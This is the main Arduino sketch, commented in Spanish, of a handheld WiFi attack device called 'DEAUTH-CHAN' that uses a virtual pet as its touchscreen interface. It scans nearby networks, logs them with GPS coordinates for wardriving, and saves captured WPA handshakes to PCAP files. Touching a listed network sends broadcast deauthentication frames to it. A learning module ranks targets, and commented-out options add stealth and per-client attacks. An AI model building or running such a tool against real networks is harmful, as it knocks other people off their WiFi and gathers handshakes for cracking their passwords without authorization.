#include <Arduino.h>
#include <TFT_eSPI.h>
#include <XPT2046_Touchscreen.h>
#include <SD.h>
#include "config.h"
#include "Mascota.h"
#include "WiFiHunter.h"
#include "PCAPWriter.h"
#include "GPSModule.h"
#include "Wardriving.h"
#include "Learning.h"

TFT_eSPI tft = TFT_eSPI();
XPT2046_Touchscreen touch(TOUCH_CS, TOUCH_IRQ);

Mascota mascota;
WiFiHunter hunter;
PCAPWriter pcap;
GPSModule gps;
Wardriving wardriver;
Learning learner;

RedInfo redes[20];
int numRedes = 0;
unsigned long lastScanTime = 0;

bool scanning = false;
int redSeleccionada = -1;

ClienteInfo* clientes = nullptr;
int numClientes = 0;
bool escaneandoClientes = false;
unsigned long clientScanStart = 0;

void onHandshakeCaptured(const uint8_t* frame, uint32_t len) {
    uint32_t ts = millis();
    pcap.writePacket(frame, len, ts/1000, (ts%1000)*1000);
    mascota.incrementarHandshakes();
    Serial.printf("Handshake capturado! %d bytes\n", len);
    // Notificar al sistema de aprendizaje
    // (se necesitaría extraer el BSSID del frame para registrar la red)
}

void setup() {
    Serial.begin(115200);
    delay(1000);
    Serial.println("DEAUTH-CHAN v1.0");
    
    pinMode(TFT_LED_PIN, OUTPUT);
    digitalWrite(TFT_LED_PIN, HIGH);
    
    tft.init();
    tft.setRotation(0);
    tft.fillScreen(TFT_BLACK);
    
    touch.begin();
    mascota.init(&tft);
    
    if (pcap.begin("deauth")) {
        Serial.println("PCAP iniciado");
    }
    
    gps.begin();
    hunter.begin();
    hunter.setHandshakeCallback(onHandshakeCaptured);
    
    // Inicializar wardriving y aprendizaje
    wardriver.begin();
    learner.begin();
    
    // Modo sigiloso (opcional)
    // hunter.setSilentMode(true);
    // hunter.randomizeMAC();
    
    Serial.println("Setup completado");
}

void loop() {
    gps.update();
    hunter.processPendingHandshakes();
    mascota.update();
    mascota.dibujar();
    
    // --- Táctil ---
    if (touch.touched()) {
        TS_Point p = touch.getPoint();
        int x = map(p.x, 0, 4095, 0, 240);
        int y = map(p.y, 0, 4095, 0, 320);
        
        if (mascota.getEstado() == ESTADO_IDLE && y > 200) {
            int indice = (y - 200) / 20;
            if (indice < numRedes) {
                redSeleccionada = indice;
                mascota.setEstado(ESTADO_ATTACK);
                
                // Ataque a la red seleccionada (broadcast)
                hunter.deauth(redes[redSeleccionada], nullptr, 30);
                // Registrar el ataque en el sistema de aprendizaje
                learner.registerAttack(redes[redSeleccionada]);
                
                // Opcional: atacar a un cliente específico (descomentar para escanear clientes)
                // hunter.scanClients(redes[redSeleccionada].bssid, redes[redSeleccionada].canal);
                // clientes = hunter.getClientes(numClientes);
                
                delay(100);
                mascota.setEstado(ESTADO_IDLE);
            }
        } else if (mascota.getEstado() == ESTADO_IDLE && y > 100 && y < 200) {
            // Zona para mostrar clientes (se puede implementar después)
            // Aquí podrías listar los clientes y al tocar uno, atacarlo específicamente
        } else {
            mascota.tocar(x, y);
        }
    }
    
    // --- Escaneo de redes ---
    if (!scanning && millis() - lastScanTime > SCAN_INTERVAL) {
        mascota.setEstado(ESTADO_SCANNING);
        hunter.startScan();
        scanning = true;
    }
    
    if (scanning && hunter.isScanDone()) {
        hunter.getScanResults(redes, 20, numRedes);
        mascota.setRedesEncontradas(numRedes);
        
        // Priorizar redes según aprendizaje
        learner.prioritizeNetworks(redes, numRedes);
        
        GPSData pos = gps.getData();
        // Guardar en CSV con wardriving
        for (int i = 0; i < numRedes; i++) {
            wardriver.saveNetwork(redes[i], pos);
        }
        
        mascota.setEstado(ESTADO_IDLE);
        scanning = false;
        lastScanTime = millis();
        Serial.printf("Escaneo completado: %d redes\n", numRedes);
    }
    
    delay(10);
}
